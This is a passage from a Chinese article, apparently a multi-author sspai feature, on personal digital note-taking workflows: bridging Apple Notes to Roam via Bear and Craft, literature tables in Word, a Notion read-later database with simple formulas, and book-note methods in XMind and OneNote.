里面，不需修改，就能正常开启。</p>\n<p>下面看看备忘录的融合。</p>\n<p>苹果的备忘录这款应用，作为临时笔记的采集器，哪方面都很好——除了和其他笔记工具的协同。</p>\n<p>它不支持导出成为 Markdown 格式。其实它连富文本、HTML，乃至于私有 XML 格式导出都不支持。它只有一个 Export 选项，你猜能导出啥格式？</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8s8tb34tcu4buqvq0.jpeg\"></figure><p>你没看错，居然是 PDF ！</p>\n<p>这里，为了能够把备忘录里面的笔记，融入笔记系统，你就需要一个「桥梁」了。我选择的桥梁，是 Bear 。你可以从备忘录里面全选一则笔记，然后复制，到 Bear 下面粘贴。结果令人满意——图片、文字、链接，一应俱全。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8s95b34tcvt9nu6r0.jpeg\"></figure><p>而 Bear 的导出选项，那可就丰富许多了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8s9db34tcvt9nu6rg.jpeg\"></figure><p>我们可以导出为 Markdown 或者 Text Bundle 格式。<a href=\"http://textbundle.org/\" target=\"_blank\">Text Bundle 格式</a> 可以看作是现代化笔记应用之间交互的标准化「集装箱」。它其实并不复杂，就是把 <a href=\"https://sspai.com/post/59314\" target=\"_blank\">Markdown 文件和相关的图片打了个包</a>。但是这样一来，你在 Bear, Ulysses, Craft, Zettlr, Metion, Marked 等工具之间，都可以用这种格式方便交换数据，样式都能保持一致。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8s9lb34tcuopj7s2g.jpeg\"></figure><p>只可惜，Roam Research 到目前为止，还不支持 Text Bundle 。所以，我们还是得考虑一下图片问题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8s9lb34tcvt9nu6s0.jpeg\"></figure><p>解决图片问题，目前有3个较为可行的方法：</p>\n<p>第一，是利用 <a href=\"https://www.craft.do/\" target=\"_blank\">Craft</a> 。Craft 可以导入 Text Bundle 。然后，你只需要拷贝当前笔记，就可以图文并茂直接贴到 Roam Research 里面。因为 Craft 把所有导入图片，都统一上传到自家的图床，都云端化了。</p>\n<p>第二，是用一款叫做 iPic Mover 的工具。它可以把一个目录下面所有 Markdown 文件里的图片，都上传到指定的图床。默认的免费图床是微博的，你也可以根据自己的需要，选择 S3, 七牛、腾讯云、阿里云等。转换之后 Markdown 文件里面全部的图片链接会自动替换为云端版本，这样可以直接批量导入 Roam Research 了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8s9tb34tcuopj7s30.jpeg\"></figure><p>第三，是自己动手，丰衣足食。例如我做了一个脚本，可以把本地目录下面全部 Text Bundle 以及 Markdown 文件，图片上传到云端，内容转换成 Roam 专用的 JSON 格式。这样导入 Roam Research 的时候更加便利。只不过，目前脚本中包含了本人图床的认证私密信息，所以暂时无法公开分享。</p>\n<p>订阅了 Bear ，只是为了导入备忘录的图文内容，导出成 Markdown ；订阅了 Craft，也只是为了上传到 Craft 图床更为便捷。看到这里，你大概能更加深刻理解什么叫「重器轻用」了吧？</p>\n<p>这不是暴殄天物、铺张浪费，而是真的为了严肃对待记笔记这个事儿。对于很多创意与灵感来说，仅仅捕捉到一个，也比订阅50年的 Bear ，都要更有价值。至于 Craft 嘛，如果你是学生，或者是学校的教职员工，可以凭借教育机构邮箱申请<a href=\"https://www.craft.do/\" target=\"_blank\">免费使用</a>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8sa5b34tcvciqaafg.jpeg\"></figure><p>不过，必须说明，上述工具组合，实际上都是动态调整的。假如说某天 Roam Research 和备忘录都支持了 Text Bundle 导入和导出，那么大量的中间环节，都可以被省略掉。</p>\n<h2>\n<a class=\"ss-atUser\" data-mention=\"@Sharon大橘子\" user-id=\"c1hk9mdb34teumhmui80\" href=\"https://sspai.com/u/880e395e\">@Sharon大橘子</a> 我在用的笔记工具是你无法想象的普普通通</h2>\n<p>我常用的设备就是 Windows 笔记本和 iPad，iPad 大多在外出时进行使用，所以最常用的还是 Windows 笔记本。很多好用的软件只能在 iPhone 或者 Mac 设备上使用，Windows 上可以使用作为电子笔记的软件比较少。尝试了很多软件，并且考虑到便捷性等因素之后，我选择最最常见的软件来做电子笔记，就是 Microsoft Office 里面的 Word 和 Execl。</p>\n<p>我现阶段读的最多的还是论文和某些专业书。我的需求其实很简单，可以清晰记录和标注重点，也可以大致总结。再加上我是一个怕麻烦的人，希望尽量笔记记录步骤尽量简洁，所以软件的使用越简单越好。其实 Word 的功能对于我做笔记来说已经绰绰有余了，使用步骤也比较清晰明了，所以翻来翻去，我还是使用 Word 最多。</p>\n<p>读文献的话我会精读几篇在这个领域中最最重要的，这几篇我会打印下来或者在iPad上手写笔记，这样记得更牢。那其他的研究我不能不读，全部手写笔记就会花费很多时间，如果用不常用的软件也不利于我后面查询和翻阅。</p>\n<p>下面我用自己近期在读的文献和自己做的笔记和大家分享一下，我是如何用 Word 来做电子笔记的。</p>\n<p>首先我会把 Word 的页面布局改成横板，页边距都改成 1.27 厘米。这样每一行可以容纳的字数更多一些，同一页面行数比较少，后续复看笔记的时候读起来少换行，更流畅一些。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8sadb34tcuopj7s40.png\"></figure><p>然后我会拉一个表格，表格的列数取决于我这次读文献主要读的几项，但是一般会包括文献的作者和年份、期刊名称、主要结论或者主要发现、笔记等几项。作者和年份一般会在写论文的时候中引用该文献的时候出现，所以第一栏这样记录，方便后面写论文的时候查询该文献的笔记。</p>\n<p>「期刊名称」一栏就是记录该论文所属的期刊，记录这一栏的原因是方便我看到这篇文献所属的领域。不同领域和学科对于某一个概念的研究可能出发点不同，研究现状也会不一样。看到一篇论文所属的期刊名称在很大程度上可以了解它所属的学科或者专业方向，在梳理和引用文献的时候可以提醒自己，也帮助自己在文献综述的时候归类和溯源。主要结论和主要发现经常是一篇论文的最重要的东西，所以我专门拉出来一栏记录。</p>\n<p>「主要发现」这一栏也会提示我这篇文章的贡献，纵向对比下来就能看出来一些论文之间的关系，也方便整理这个领域的发展脉络，还提醒我文献综述中各个文章的重要性和地位。最后一栏就是我自己的笔记。我会记录一些自己对于这篇论文的思考，关于这篇文章给我的启发，以及我认为的这篇文章的不足和未来可以改善的地方。还有我也会记录一些论文中值得被标记的地方，比如在引言中突出的这篇文章的研究问题，论文的组织思路，一些构念的测量，以及实验设计的思路等等我能学习到的地方。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8sadb34tcvt9nu6sg.png\"></figure><p>表中更加重要的笔记内容我会进一步用不同颜色进行区分，一般是黄色高亮是最最重要的部分，下划线是次重要的部分。如果内容还是特别多还需要区分出来的话，比如结论较多且结构较为复杂的论文，我会选择一些相近的颜色和色系来对一些内容进行区分。当然这个看个人爱好，也有很多人喜欢用对比明显的一些颜色来对笔记内容进行区分和标注。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8salb34tcuopj7s4g.png\"></figure><p>还有就是关于文献的排序。我个人是喜欢按照作者的首字母进行排序的，这样的顺序也符合我在论文中参考文献的排列顺序，也方便我回忆和查找。当然我有时候也会按照年份排序，这样可以看到这个领域最新的研究进展。也会有别的顺序，这个也是看个人习惯。</p>\n<p>每读一篇我就可以根据自己定的顺序插入一行，在读之前依次输入作者和年份以及来源期刊名称。一边读一边在笔记的那一栏进行记录。最后读完整篇论文我会记录主要发现或者主要结论，整理自己在笔记那一栏的内容。比如下图是我近期整理的关于风险感知的相关研究的笔记中的一部分。发表时间最早到 2001 年，最晚到 2021 年，涉及的领域包括医学、心理学、营销学、旅游管理等不同学科和专业。用黄色标记的是我笔记中的重点。由于风险感知相关的一些文献我之前读过不少，这次再次整理记录是为了补足我之前知识缺口，所以并没有区分次重点和其他要点。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8salb34tcu4buqvqg.png\"></figure><p>当然，如果栏数比较多而且不喜欢 Word 的分页的话，可以选择 Excel 进行记录。Excel 比 Word 可以便捷地记录更多栏，也更加方便查找和筛选一些文章的年份。如果需要详细地记录一些文章的理论、自变量、因变量、实验方法等，Excel就可以在同一页面的表格中拉出来更多栏。但是大致思路和我用 Word 进行电子笔记的记录是一样的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8satb34tcvciqaag0.png\"></figure><p>以上就是我关于电子笔记的一些分享，欢迎大家一起交流！</p>\n<h2>\n<a class=\"ss-atUser\" data-mention=\"@桌沿奇思\" user-id=\"bs2per5b34tcs0poelh0\" href=\"https://sspai.com/u/379wzx2e\">@桌沿奇思</a> 我用 Notion 解决「稍后老不读」、「读了老是忘」的烂毛病</h2>\n<p>知乎上有一个有趣的问题——「稍后阅读，稍后真的会阅读吗？」，最高赞的回答也十分风趣：「这个问题好，我稍后回答。」</p>\n<p>曾几何时，各种「稍后读」工具层出不穷，试图解决我们的信息焦虑。但是，当我们看着相关工具里的文章像是滚雪球一样越积越多，我们只会变得愈发焦虑，而非享受咀嚼、消化新知识的愉悦感。</p>\n<p>显然，稍后读工具的初衷是善良、积极的，但是我们在使用它们的时候，产生了一个明显却常常不自知的误区：我们认为只要开始使用这些工具，自己不用作出任何调整，就能够一劳永逸的解决文章「没时间阅读」、「读了忘得快」等难题。</p>\n<p>殊不知，工具永远只是工具，正确的目的和方法论才是激发工具效力的正确打开方式。能够有效配合目的和方法论的任何工具，都是好工具。</p>\n<h3>放弃幻想，脚踏实地</h3>\n<p>当走得太远，我们便常常忘记我们为什么出发。同理，当折腾工具太久，我们便常常忘记我们为什么需要他们。稍后读的内核永远不会是「稍后」，而是「读」。我们的目的，始终是希望自己能够阅读这些文章，才会将它们暂时存储在工具中。而阅读，必定会消耗我们一定的时间和精力。</p>\n<p>因此，不要只是寄希望于下载某个软件来帮助自己，而是应该提前规划好每天、每周自己有多少时间来消化这些文章，然后再去寻找适合自己的软件来帮助自己管理文章，才应该是打败「稍后不再读」的第一步。</p>\n<p>因此，不妨现在就做一个简单的思考——我一天之中到底有多少闲暇时间用来阅读这些文章，放到一周之中又有多少时间？不仅仅是大片的闲暇时间，通勤、排队、走路（可以让Siri朗读文章）、独自吃饭等零碎时间，都可以纳入其中。</p>\n<h3>为什么选择 Notion：输入与输出的大一统</h3>\n<p>不选择 Pocket、Instapaper 等老牌专业稍后读工具，主要在于「割裂感」。互联网文章再好，归根结底也只是知识的一种载体。因此，我们是如何学习来自课堂、书本的知识，我们就应该同样对待互联网文章中蕴含的知识——当然，前提是这些文章较为优质。</p>\n<p>一方面，我们习惯于不重视互联网文章，却又离不开它们，觉得几天不看，好像自己就与世界割裂了。因此，我们常常流于「扫读」，不会「精读」，很少甚至几乎不可能「反复阅读」。另一方面，使用其他工具进行笔记摘抄、学习记录，会与我们已有的笔记体系割裂开来。对于我这个主要使用电子笔记的人，这会带来迁移笔记的麻烦，浪费时间和精力。</p>\n<p>因此，自从 Notion 上线网页剪藏功能后，我便开始使用 Notion 来进行互联网文章管理。</p>\n<p>以上只是我选择 Notion 的第一点原因。更重要的原因，在于 Notion 的便利、分类管理和汇总统计。为了更清晰地阐明我的方法，我将将「我是如何储存、消化和转化一篇互联网文章」的完整流程，结合 Notion 的优点展示给你看。</p>\n<h3>储存，便利剪藏</h3>\n<p>什么时候我们会用到稍后读功能？显然，在我们当下没时间阅读的时候。因此，如果剪藏功能不能在做到足够便利，那么我们很难长久坚持使用它。</p>\n<p>Notion 自然不存在类似问题，在电脑浏览器上，通过两次点击即可完成剪藏。在手机上，以 iPhone 为例，与分享内容给朋友的操作步骤几乎一样，仅需三次点击。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8sb5b34tcvciqaagg.png\"><figcaption>Notion 桌面端浏览器剪藏</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/dcb4200ece97e14081d1409fa5c6b863.png\"><figcaption>在 iOS 中用 Notion 剪藏网页</figcaption></figure><p>剪藏后，Notion 会自动在你选择的目标数据库（database）中添加一条数据，包含页面名称和页面网址（url）。另外，对于 Notion 服务器能抓取到的网页内容，Notion 会自动储存进该页面中。但是很可惜，对于境内大部分网页而言，无论是微信公众号还是少数派，Notion 都无能为力，如果你想储存文章内容，那么只能靠你手动复制粘贴了。</p>\n<p>其实，曾经的我也非常在意稍后读软件能不能把网页全文自动复制并储存到软件内部，以避免之后网页失效或文章删除等意外事故。但是后来发现，自己阅读的文章类型几乎不会发生类似事件，更重要的是，我还是喜欢网页文章原来的排版风格（在这里怒夸少数派），而非很多稍后读软件自带的九十年代土味排版风格。</p>\n<p>除了剪藏体验外，Notion 的阅读体验也同样流畅。</p>\n<p>打开文章库，只需要找到自己想浏览的文章，点击旁边对应 URL 上的链接符号「🔗」，Notion 便会打开对应网页。如果稍后会使用 Notion 做其他事情，那不妨点击右下角的浏览器跳转到 Safari 进行阅读。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8scdb34tcuopj7s5g.png\"></figure><h3>消化，费曼技巧</h3>\n<p>斗转星移，现在的我们坐在地铁通勤的路上，人潮挤挤，不妨掏出手机阅读之前暂存的文章吧。</p>\n<p>互联网文章，诚然也是知识的重要载体，但因其处于互联网信息洪流之中，加之整个互联网信息良莠不齐的背景，我们很难对互联网文章和作者产生高度的尊重和认同。在我们决定阅读和学习一篇文章的时候，我们应该做的是判断这篇文章值不值得我们花时间和精力去阅读。如何识别文章优劣，已经另行一文了，这里不做赘述。</p>\n<p>「阅读状态」，我分为「已经读完、值得复读、暂存实用、已被丢弃」五大类。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8sctb34tcuopj7s60.png\"></figure><p>乔布斯曾经的一句话让我深以为然：重要的不是决定要做什么，而是决定不做什么。因此，最重要的一类，或许是「已被丢弃」这个文章垃圾桶。为什么说它重要，是因为这能节省我们宝贵的时间，避免浪费时间在阅读低质量的文章上。一旦你在扫读一遍或浏览前几段后，认为这篇文章质量不高、排版很烂或与自己严重不相关，那就大胆地直接把它「扔」进垃圾桶里吧！</p>\n<p>什么，你很担心错过哪篇重要的文章？其实，这只不过是现代人的信息焦虑在作祟，我将我派付费栏目「<a href=\"https://sspai.com/series/73/list\" target=\"_blank\">高效信息管理术 2.0</a>」中的这段话送给你：</p>\n<blockquote><p>那些你没有处理的信息，也并不意味着永远失去了它们。它们也已经纳入到了你的个人信息数据库中，具备被检索到的可能性。在未来的日子，当你需要完成某一项工作，开启一项系统的主题阅读，搜索某个关键词，那些还没有时间被认真阅读的文章就会被你重新唤醒，也许能给你最意想不到的惊喜。真正有价值的信息可能会迟到，但永远不会缺席，放下对「读完」的执念，用新的观念和方法拥抱这个快速迭代的数字时代吧。</p></blockquote>\n<p>其次，是「值得复读」。读完一遍后觉得很爽很过瘾，或者觉得很有用的文章，都可以打上这个标签。「已被读完」，则是无功无过还不错的文章。「暂存实用」则是一些现阶段用不上，但是感觉自己以后会用上、管他三七二十一先剪藏了再说的文章，比如装修、维权等文章。</p>\n<p>到这里，你只完成了第一步。最重要的步骤才刚刚开始。既然不是无用文章，那我们便可以开始阅读了。</p>\n<p>我在阅读的时候主要会采用费曼学习法，即用自己的话复述一遍重要信息，并把笔记直接记录到对应单元格「费曼技巧」里。这样也方便我后期在复盘文章的时候，进行文章重点的快速浏览。当然，如果时间充裕的话，能够模拟将这篇文章以教的形式复述给别人，会达到更佳的学习效果。</p>\n<p>这个过程，实际上就是在用系统化、固定化的方式，通过进行简单的分类和笔记记录，倒逼自己对有用的互联网文章进行真实的阅读、知识梳理和复盘。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8sd5b34tcu4buqvrg.png\"></figure><p>读完后，我还会对文章内容进行简要的主题、体裁分类和快速评价，便于后期我对某一主题的文章感兴趣的时候，能够快速查阅到。</p>\n<h3>汇总，成就满满</h3>\n<p>能够有所记录和追踪的日子，总是让我安心不少。尤其对于阅读这件事而言，看完一本书忘掉一本、读完一篇文章忘掉一篇，实在是让我觉得很头痛。还好，Notion 也能帮到这一点。</p>\n<h4>视图功能</h4>\n<p>在我自己的阅读数据库里，我主要分为五类表格：未读文章库、最近添加的文章库、值得复读的文章库、全部文章库和辣鸡文章库。这些表格之间通过不同的筛选器（filter）和排序规则（sort）进行自动区分。在这里也分享一下我的分类规则。</p>\n<p>未读文章库的规则是，筛选：尚未打上状态标签的文章，排序：按剪藏天数最小到最大。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8sddb34tcvt9nu6tg.png\"></figure><p>最近添加的文章库的规则是，筛选：最近一个月的新增文章，排序：按剪藏天数最小到最大。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8sdlb34tcuopj7s6g.png\"></figure><p>值得复读的文章库的规则是，筛选：状态为「值得复读」的文章，排序：按主题和体裁排序。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8sdtb34tcvciqaah0.png\"></figure><p>全部文章库的规则是，筛选：状态不是「已被丢弃」的文章，排序：按主题和体裁排序。解释一下为什么既然是全部文章，为什么还会有筛选规则，是因为我认为既然已经单独设置了辣鸡文章库，那么「全部文章库」里就不再需要它们的出现了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8sedb34tcvciqaahg.png\"></figure><p>辣鸡文章库的规则是，筛选：状态为「已被丢弃」的文章，排序：无。</p>\n<p>Notion 在不同视图之间数据的无缝切换，是我认为 Notion 最厉害的创新之一。虽然 Notion 提供了丰富的视图类型，但是，如你所见，我主要使用的还是表格视图（Table view）。当然，如果你喜欢其他视图，你可以随时更改，毕竟 Notion 中的视图模式和筛选、排序规则不相冲突。</p>\n<h4>函数功能</h4>\n<p>显然，如果我们仅仅只是读完了，或者读了几遍，可能还是差那么点味道。Notion 的数据库，厉害就厉害在集成了类似 Excel 的实用功能。</p>\n<p>比如，「来源」一栏，由下列函数（formula）自动判断并显示文章的来源网站。你也可以通过更改每一行第二个和第三个引号中的内容，来增加自己常读的网站。</p>\n<pre class=\"language-plain text\"><code>if(contains(prop(\"URL\"), \"sspai\"), \"少数派\", if(contains(prop(\"URL\"), \"weixin\"), \"公众号\", if(contains(prop(\"URL\"), \"weibo\"), \"微博\", if(contains(prop(\"URL\"), \"bilibili\"), \"B站\", if(contains(prop(\"URL\"), \"zhihu\"), \"知乎\", \"others\")))))</code></pre>\n<p>比如，「剪藏天数」一栏，显示了这篇文章已经剪藏了多久，等待着如同陈年好酒一般的发酵。这个函数调用了一个被我隐藏的、自动生成的属性「创建日期」（Created time）。</p>\n<pre class=\"language-plain text\"><code>dateBetween(now(), prop(\"创建日期\"), \"days\")</code></pre>\n<p>再比如，「文章名」这一列的最下方有一个数据汇总，显示了我当前页面一共有多少篇文章。如果是在「全部文章」页面，自然就是从古至今我一共剪藏的文章数量，目前是 270+ 篇文章。而如果是「未读文章」页面，自然就是等待着我临幸的文章数量了，目前又双叒叕囤了 66 篇，留待我慢慢消化。</p>\n<h3>开始你的囤货，也开始你的阅读</h3>\n<p>在软件支持方面，在电脑端，Notion 的剪藏功能已支持 Chrome（包含 Edge 等使用 Chromium 内核的浏览器）、Firefox、Safari 等主流浏览器。在移动端，只要安装有Notion客户端，在任意浏览器都可以将页面分享到 Notion 进行剪藏。这意味着无论你是 Windows 还是 macOS 用户，iPhone 或者安卓用户，你都可以无缝、流畅体验 Notion 的剪藏功能。想要了解更多信息，你可以在<a href=\"https://www.notion.so/Web-Clipper-ba54b19ecaeb466b8070b9e683c5fce1\" target=\"_blank\">Notion 的官方页面</a>查询到适合你设备的下载或使用方式。</p>\n<p>世上无难事，只怕有心人。有心的人，不仅会有目标，也会去寻找适合自己和自己的目标的方法。同样的，任何事物都有两面性，不必因噎废食，我们只要能根据自己的需求，攫取到互联网文章的优势，就足够了。让互联网的便利、速度和有趣来帮助自己，而非让其垃圾资讯、无聊娱乐来干扰我们，这或许是信息时代公民的新必修课。</p>\n<p>希望你能享受互联网文章的乐趣，祝你阅读愉快！</p>\n<h2>\n<a class=\"ss-atUser\" data-mention=\"@前进鲨鱼\" user-id=\"bs2pf85b34tcs0poigpg\" href=\"https://sspai.com/u/qianjinshayu\">@前进鲨鱼</a> 我爱读书，所以我需要更高效的读书笔记</h2>\n<p>提到读书笔记这件事，我个人认为阅读的喜好、兴趣，甚至连阅读的方式都是很私人的一件事情，更别提每个人写读书笔记的方式了。</p>\n<p>数了一下，截止到 2021 年的 8 月，这大半年我一共读了 70 多本书，跟往年的阅读状态差不多。今年写读后感的读书笔记较少，平日里大多数时间都是在摘句中记录下自己的阅读感受。我喜欢在那些打动过自己的作品下认真做读书笔记，并坚信这些笔记会在日后时间的洗涤和发酵中焕发出新的能量。</p>\n<p>我个人认为，如果读完一本书，没有收获新的视角和观点，无法用自己的语言表达书中的观点，也没有真正实践过书中的内容，等于白看。我似乎把读书这件事描述得十分功利化，但身处在一个信息轰炸的时代，阅读书籍的途径暴增，我们可能读过很多书，但是书中记住的内容，收获的知识可能强差人意，找到适合自己的读书笔记显得尤为重要。</p>\n<p>信息时代，做读书笔记可以帮我们汲取书中有价值的信息和引导我们塌实地理解吸收和应用书中的知识。接下来，我想分享一下我的电子读书笔记整理术。</p>\n<h3>手写笔记 vs 电子笔记</h3>\n<p>无论是哪种类型的读书笔记，最终还是得看自己的学习习惯。读书笔记原本就是一件纯粹又简单的事情，不必复杂化，更不必模式化，不要只流于表面的形式，更不要为自己额外增加繁复的操作。简单来说，我们需要做有效率和实用的读书笔记而不是仅有观赏性的读书笔记。</p>\n<p>找到适合自己的笔记方式，对之后的阅读会很有帮助。在宝贵的阅读时间里把读书笔记做到极致，就需要有的放矢，寻找到适合自己的读书笔记法。</p>\n<p>在手写笔记和电子笔记中，我个人比较推荐电子笔记，因为它相对来说更方便记录和查看，并且灵活性非常高，而打字的过程就是一个记忆的过程。手写笔记的缺点则很明显，耗时耗力，需要先把内容过一遍才好「布局」，否则笔记凌乱自己也不愿再看。而且知识都是分散的，逻辑层次感不强，不利于从整体的角度把握知识。</p>\n<p>牢记一个原则：读书笔记是给自己看的，不管是手写笔记还是电子笔记，都只是一个工具，只要能帮助我们把知识整理归纳，便于查看，即：达到目的就好。</p>\n<h3>读书笔记到底记什么</h3>\n<ol>\n<li>记下书中的核心论点以及补充应用形式。假设自己在读完这本书之后需要跟老板/下属/同学/朋友讲解，那么每一章的重点是什么？哪些是必须要摘抄下来的内容？</li>\n<li>记录书中的核心论述逻辑。可以试试用最简单的流程图来记录关键的论据。</li>\n<li>记录书中自己觉得有道理的地方。这些笔记往往和自己过去的经历产生共鸣，可以将相对应的经历记录下来。哪些是我们觉得特别受用的？</li>\n<li>记录书中自己觉得有问题的地方。并不需要担心如何解决，把问题记录下来，可以之后再去研究。这里面有哪些可以作为素材和资料的？</li>\n</ol>\n<h3>读书笔记法之思维导图</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8selb34tcvt9nu6u0.jpeg\"><figcaption>我主要用 XMind 作为思维导图工具</figcaption></figure><p>并不是所有书籍都适合使用思维导图，我一般在读阅读专业书籍或者某些主题的书籍的时候都会使用思维导图。我目前正在使用 XMind 这款软件进行思维导图读书笔记法。XMind 本身就提供各种主题模板，所以实际操作起来十分简单。XMind 还可以一键生成大纲版，当我们做完思维导图后，大纲版也会随着形成，我们可以直接使用大纲版回顾整体。</p>\n<p>要判断正在阅读的书籍是否适用思维导图，有以下的办法：</p>\n<ol>\n<li>阅读书名和序，了解主题和作者的意图</li>\n<li>研究目录，概括性理解这本书的基本架构</li>\n<li>粗略浏览每章节的开头和结尾</li>\n</ol>\n<p>具体操作：</p>\n<ol>\n<li>先浏览这本书的目录，目录就是整本书的框架，因此我们根据目录就可以直接划分出本书的知识点的分支，另外在自行判断是否需要添加自己补充进去的分支。</li>\n<li>专业书籍的书名即里面围绕的内容，直接在思维导图的中间写上本书的名字。如果书籍的书名并没有指明书籍内容，我们则需要在粗略翻阅书籍后做出判断，自己总结书籍的主题。</li>\n<li>根据书籍的目录总结一下书籍内容分为哪几个知识点，并把这些知识点作为分支画出来。</li>\n<li>一个分支一个分支的学习。从第一个分支开始，翻到分支所处的页面，判断这一个大的内容下面有多少需要记录的小知识点，随后把这个大分支画出若干个小分支，每个小分支就是每个小的知识点。自己大概看一下这个知识点的全部内容，然后用一句简短的话来总结概括，并写在小分支后面。</li>\n<li>边阅读边完成整个思维导图。</li>\n<li>在完成思维导图后，可以在导图笔记的角落标注书名、作者、日期以及关键词。日后当我们需要整理思维导图的笔记的时候，就可以直接按照关键词和日期来整理。</li>\n</ol>\n<p>在做笔记的过程中，我们一定要明确哪些地方要精读，哪些地方要略读。临近的分支一定要用颜色来区分，否则分支太多很难辨别。复习的时候，可以打开一个新的思维导图，从最重要的知识点开始，完全按记忆写出整个思维导图，写完全部结束之后，再检查一下自己有多少东西是遗漏的，有多少东西是遗忘的。</p>\n<h3>读书笔记法之纯摘抄</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8setb34tcuopj7s70.jpeg\"></figure><p>纯摘抄读书笔记法适合大家单纯摘抄书籍中所受到启发的句子。这类型的笔记我通常会直接在 Microsoft OneNote 上完成，免费、强大的编辑功能、自由布局的几大特点是其他软件无法代替的。在我们建立好笔记本后，可以分为：分区组-分区-页面-子页，可以直接用来搭建个人的知识体系。</p>\n<p>虽然我把这个读书笔记法称作为纯摘抄，但是在大部分的情况下，我都不会单单对一本书的内容进行纯摘抄，我有自己的摘抄规则。</p>\n<p>具体操作：</p>\n<ol>\n<li>将自己喜欢的段落复制粘贴下来。</li>\n<li>思考如何实践段落里的内容，我一般习惯在摘抄的原文段落后面补充自己可以在下次写作中的什么话题中使用这个知识点。</li>\n<li>补充摘抄段落里的具体解释，有些自己喜欢的句子在书里并没有附上详细解释的时候，我会习惯性用自己的想法给某个概念冠上属于自己的、新的解释，以至于可以帮助我更好得去理解。</li>\n<li>添加更多的新内容，在纯摘抄笔记的后面，我会根据这个段落的内容，继续表达我自己对此的观点。</li>\n</ol>\n<p>当我们读过更多的书，再回来看书评笔记时，可能会有新的想法需要添加进去，或者是注意到之前忽略的知识点内容，这个时候电子笔记则可以很轻松将内容进行添加或者补充。除了以上三种情况，我有时候会在做笔记时试着把自己的想法与作者的语言相结合，模仿书中作者的强调语气及行文风格，这种「偷梁换柱」的方法可以促进我们更加投入去了解作者在书中所想表达的内容。</p>\n<h3>读书笔记法之书评</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8sf5b34tcvciqaai0.jpeg\"></figure><p>书评读书笔记就是当我们在看完一本书之后把自己想说的话全部写出来。我个人认为只要是自己有感而发的书籍都应该立即写书评。</p>\n<p>同样的，我习惯用 Microsoft OneNote 完成这类型的读书笔记。</p>\n<h4>具体操作</h4>\n<ol>\n<li>用自己的话对整本书的内容进行概括性的描写。切勿写太多废话，尽量把最打动自己的地方结合整本书的内容进行记录。</li>\n<li>书评的第二部分内容可以大致描写一下自己的想法。可以是关于作者某个观点的想法，或者对整本书的总体看法。我个人喜欢在描写自己想法的时候，尽量按照作者写这本书的语言风格来写，这样可以锻炼到自己的文笔。可能很多人会害怕自己的文字底蕴比不上作者，但只要我们多点尝试将作者所表达的某一个观点与自己息息相关的生活、想法联系在一起，并进行输出，那我们的文字输出水平也会越来越强大。记住，当我们以文字输出、思想输出作为写读书笔记的目的时，输出的动作会自然而然地加深我们对书籍内容的理解。</li>\n<li>写下目标和行动。可以写下看完书后对自己的启发以及想要实现的目标。最后写下读完这本作品之后，自己要付诸的行动。</li>\n</ol>\n<p>书评读书笔记有着独特风格的应用文体，是我们自己对书中观点和自己想法的整合理解。虽说书评笔记在大多数情况下会记录下我们当时的感受，但当我们过一段时间再回首看看自己写的书评笔记，或许会有新的感悟出现。第一次写下的书评笔记是自己与书籍的深入交流。当我们有了更多阅历，回来再看自己的书评或者把一些新的想法增添到书评笔记里时，我们就相当于和以前的自己做了一次跨时空的交流。</p>\n<h3>RIA 便签读书法</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8sfdb34tcvciqaaig.jpeg\"></figure><p>RIA 便签读书法的重点是在于 RIA，即是 Read 阅读理解，Interpretation 个人诠释，Appropriation 应用方法。RIA 便签读书法能够快速让我们的个人经验与阅读书籍后的知识点产生链接，并且催化出实际的行动计划。当我们看到书中的一段文字、提到的一个方法/思路的时候，可以用 RIA 三张便签读书法对知识点进一步分解。</p>\n<p>原本的 RIA 便签读书法是利用三张不同颜色的便利贴，然后分别在便利贴上重述知识点，描述自己的相关经验，以及应用方法。同样，RIA 便签读书法可以直接运用在电子笔记上，我们只需要把纸质的便利贴换成有三个区分空间的电子笔记的页面即可，操作十分简单。在电子笔记中，参照上文提及的 RIA 具体操作，写出自己对文段的理解，诠释和应用。最后在电子文档里记好笔记对应的文字，或者直接截图、照相相应页面到 RIA 笔记下面，方便以后自己翻阅。</p>\n<p>我个人还是会选择 Microsoft OneNote 进行 RIA 